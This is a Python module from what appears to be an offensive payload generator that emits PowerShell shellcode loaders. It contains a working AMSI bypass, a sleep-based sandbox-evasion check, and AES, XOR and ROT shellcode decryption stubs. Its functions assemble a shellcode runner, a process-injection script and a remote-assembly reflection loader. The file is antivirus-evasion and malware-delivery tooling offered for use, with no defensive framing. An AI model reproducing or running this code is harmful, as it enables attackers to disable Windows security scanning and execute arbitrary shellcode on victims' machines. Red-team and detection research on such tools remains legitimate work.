import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

from .utils import *

path = os.path.dirname(__file__)

amsi = """
Foreach($type in [Ref].Assembly.GetTypes()){if($type.Name -like "*iuti*"){Foreach($field in $type.GetFields('NonPublic,Static')){if($field.Name -like "*iinit*"){$field.SetValue(0,$true)}}}}
"""

delay = """
$now = [DateTime]::Now
Start-Sleep -Seconds $DELAY
$deltaT = ([DateTime]::Now).Subtract($now).TotalSeconds

if ($deltaT -lt ($DELAY - 0.5)) {
    exit
}
"""

shellcode ="""
$buf  = {{SHELLCODE}}
"""

aes = """
$key = {{KEY}}
$iv  = {{IV}}

$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key
$aes.IV  = $iv

$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$decryptor = $aes.CreateDecryptor()

$ms = New-Object System.IO.MemoryStream
$cs = New-Object System.Security.Cryptography.CryptoStream($ms, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)

$cs.Write($buf, 0, $buf.Length)
$cs.FlushFinalBlock()
$cs.Close()

$buf = $ms.ToArray()
$ms.Close()
$aes.Dispose()
"""

xor = """
$KEY = {{KEY}}
for ($i = 0; $i -lt $buf.Length; $i++) {
    $buf[$i] = $buf[$i] -bxor $KEY
}
"""

rot = """
$KEY = {{KEY}}
for ($i = 0; $i -lt $buf.Length; $i++) {
    $buf[$i] = [byte]( ($buf[$i] - $KEY) -band 0xFF )
}
"""

def bytes_to_ps(data):
    hex_bytes = [f"0x{b:02X}" for b in data]
    return ", ".join(hex_bytes)

def av_bypass(shellcode, encrypt, key, iv, time, amsi_bypass):
    payload = '$buf  = {{SHELLCODE}}'.replace('{{SHELLCODE}}', bytes_to_ps(shellcode))
    if delay:
        payload += delay.replace('{{DELAY}}', str(time))
    
    if amsi_bypass:
        payload += amsi

    if encrypt.upper() == 'AES':
        payload += aes.replace('{{KEY}}', bytes_to_ps(key)).replace('{{IV}}', bytes_to_ps(iv))
    elif encrypt.upper() == 'XOR':
        payload += xor.replace('{{KEY}}', hex(key))
    elif encrypt.upper() == 'ROT':
        payload += rot.replace('{{KEY}}', hex(key))

    return payload

def shellcode_runner(shellcode, encrypt, key, iv, delay, amsi):
    with open(os.path.join(path, 'templates/ps/shellcode_runner.ps1'), 'r') as f:
        code = f.read()
    payload = av_bypass(shellcode, encrypt, key, iv, delay, amsi)
    return code.replace('{{PAYLOAD}}', payload)

def process_injection(shellcode, encrypt, key, iv, delay, amsi, process):
    with open(os.path.join(path, 'templates/ps/process_injection.ps1'), 'r') as f:
        code = f.read()
    payload = av_bypass(shellcode, encrypt, key, iv, delay, amsi)
    process_name = os.path.splitext(os.path.basename(process.replace('\\','/')))[0]
    return code.replace('{{PAYLOAD}}', payload).replace('{{PROCESS}}', process_name)

def assembly_reflection(url):
    with open(os.path.join(path, 'templates/ps/assembly_reflection.ps1'), 'r') as f:
        code = f.read()
    return code.replace('{{URL}}', url)